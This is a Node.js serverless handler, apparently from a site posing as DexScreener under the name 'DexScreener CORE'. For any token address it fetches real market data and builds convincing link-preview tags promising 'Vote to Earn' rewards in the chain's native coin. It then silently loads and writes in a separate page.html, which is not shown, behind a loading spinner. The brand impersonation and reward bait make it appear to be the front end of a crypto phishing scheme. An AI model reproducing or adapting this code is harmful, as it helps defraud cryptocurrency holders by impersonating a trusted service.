const https = require('https');

function httpsGet(url) {
    return new Promise(function(resolve, reject) {
        var req = https.get(url, function(response) {
            if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
                return httpsGet(response.headers.location).then(resolve).catch(reject);
            }
            var data = '';
            response.on('data', function(chunk) { data += chunk; });
            response.on('end', function() {
                resolve({ status: response.statusCode, body: data });
            });
        });
        req.on('error', function(err) { reject(err); });
        req.setTimeout(5000, function() { req.destroy(); reject(new Error('timeout')); });
    });
}

function esc(s) {
    return String(s || '')
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function formatMcap(n) {
    if (!n || n === 0) return '$0';
    if (n >= 1e9) return '$' + (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return '$' + (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return '$' + (n / 1e3).toFixed(1) + 'K';
    return '$' + Math.round(n);
}

var CHAIN_REWARDS = {
    solana: 'SOL', ethereum: 'ETH', bsc: 'BNB', polygon: 'MATIC',
    arbitrum: 'ETH', avalanche: 'AVAX', base: 'ETH', optimism: 'ETH',
    fantom: 'FTM', cronos: 'CRO', sui: 'SUI', ton: 'TON',
    mantle: 'MNT', linea: 'ETH', blast: 'ETH', scroll: 'ETH',
    zksync: 'ETH', sei: 'SEI', near: 'NEAR', aptos: 'APT'
};

module.exports = async function handler(req, res) {
    try {
        var ca = req.query.ca || req.query.token || '';
        var host = req.headers.host || 'dexscreener-vote-nine.vercel.app';
        var fullUrl = 'https://' + host + '/?ca=' + encodeURIComponent(ca);
        var pageRedirect = '/page.html' + (ca ? '?ca=' + encodeURIComponent(ca) : '');

        var ogTitle = 'Vote to Earn — DexScreener CORE';
        var ogDesc = '🗳 Vote and earn rewards from the community voting pool';
        var ogImage = 'https://dexscreener.com/og.png';

        // ── Fetch token data if CA provided ──
        if (ca && ca.length > 10) {
            try {
                var apiUrl = 'https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(ca);
                var result = await httpsGet(apiUrl);

                if (result.status === 200) {
                    var data = JSON.parse(result.body);

                    if (data.pairs && data.pairs.length > 0) {
                        var pair = data.pairs.sort(function(a, b) {
                            var aLiq = (a.liquidity && a.liquidity.usd) || 0;
                            var bLiq = (b.liquidity && b.liquidity.usd) || 0;
                            return bLiq - aLiq;
                        })[0];

                        var token = pair.baseToken || {};
                        var chain = pair.chainId || 'unknown';
                        var mcap = pair.fdv || pair.marketCap || 0;
                        var chainSym = CHAIN_REWARDS[chain] || chain.toUpperCase();
                        var name = token.name || token.symbol || 'Token';
                        var symbol = token.symbol || token.name || '???';
                        var mcapStr = formatMcap(mcap);

                        if (pair.info && pair.info.imageUrl) {
                            ogImage = pair.info.imageUrl;
                        } else {
                            ogImage = 'https://dd.dexscreener.com/ds-data/tokens/' + chain + '/' + ca + '.png';
                        }

                        ogTitle = name + ' — Vote to Earn ' + chainSym;
                        ogDesc = '🗳 Vote for ' + symbol + ' · ' + mcapStr + ' mcap · Earn ' + chainSym + ' rewards from the community voting pool';
                    }
                }
            } catch (apiErr) {
                console.error('API error:', apiErr.message);
            }
        }

        // ── Generate HTML with OG tags + instant redirect ──
        var html = '<!DOCTYPE html>\n'
            + '<html lang="en">\n'
            + '<head>\n'
            + '<meta charset="UTF-8">\n'
            + '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
            + '<title>' + esc(ogTitle) + '</title>\n'
            + '<meta name="description" content="' + esc(ogDesc) + '">\n'
            + '\n'
            + '<!-- Open Graph -->\n'
            + '<meta property="og:type" content="website">\n'
            + '<meta property="og:site_name" content="DexScreener CORE">\n'
            + '<meta property="og:title" content="' + esc(ogTitle) + '">\n'
            + '<meta property="og:description" content="' + esc(ogDesc) + '">\n'
            + '<meta property="og:image" content="' + esc(ogImage) + '">\n'
            + '<meta property="og:image:width" content="512">\n'
            + '<meta property="og:image:height" content="512">\n'
            + '<meta property="og:url" content="' + esc(fullUrl) + '">\n'
            + '\n'
            + '<!-- Twitter Card -->\n'
            + '<meta name="twitter:card" content="summary_large_image">\n'
            + '<meta name="twitter:title" content="' + esc(ogTitle) + '">\n'
            + '<meta name="twitter:description" content="' + esc(ogDesc) + '">\n'
            + '<meta name="twitter:image" content="' + esc(ogImage) + '">\n'
            + '\n'
            + '<link rel="icon" type="image/png" href="' + esc(ogImage) + '">\n'
            + '\n'
            + '<style>\n'
            + '  * { margin: 0; padding: 0; box-sizing: border-box; }\n'
            + '  body {\n'
            + '    background: #020203;\n'
            + '    display: flex;\n'
            + '    align-items: center;\n'
            + '    justify-content: center;\n'
            + '    height: 100vh;\n'
            + '    flex-direction: column;\n'
            + '    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;\n'
            + '  }\n'
            + '  .spinner {\n'
            + '    width: 50px; height: 50px;\n'
            + '    border: 3px solid rgba(34,197,94,0.1);\n'
            + '    border-top-color: #22c55e;\n'
            + '    border-radius: 50%;\n'
            + '    animation: spin 1s linear infinite;\n'
            + '  }\n'
            + '  @keyframes spin { to { transform: rotate(360deg); } }\n'
            + '  .text {\n'
            + '    margin-top: 20px;\n'
            + '    color: #6b7280;\n'
            + '    font-size: 14px;\n'
            + '    font-weight: 600;\n'
            + '    letter-spacing: 1px;\n'
            + '  }\n'
            + '</style>\n'
            + '</head>\n'
            + '<body>\n'
            + '  <div class="spinner"></div>\n'
            + '  <div class="text">LOADING...</div>\n'
            + '  <script>\n'
            + '    var target = ' + JSON.stringify(pageRedirect) + ';\n'
            + '    var xhr = new XMLHttpRequest();\n'
            + '    xhr.open("GET", target, true);\n'
            + '    xhr.onload = function() {\n'
            + '      if (xhr.status === 200) {\n'
            + '        document.open();\n'
            + '        document.write(xhr.responseText);\n'
            + '        document.close();\n'
            + '      } else {\n'
            + '        window.location.replace(target);\n'
            + '      }\n'
            + '    };\n'
            + '    xhr.onerror = function() {\n'
            + '      window.location.replace(target);\n'
            + '    };\n'
            + '    xhr.send();\n'
            + '  </' + 'script>\n'
            + '</body>\n'
            + '</html>';

        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('Cache-Control', 'public, s-maxage=120, max-age=60, stale-while-revalidate=300');
        return res.status(200).send(html);

    } catch (err) {
        console.error('Handler error:', err.message);
        var fallbackCA = (req.query && req.query.ca) || '';
        var fallback = '/page.html' + (fallbackCA ? '?ca=' + encodeURIComponent(fallbackCA) : '');
        res.setHeader('Location', fallback);
        return res.status(302).send('Redirecting...');
    }
};
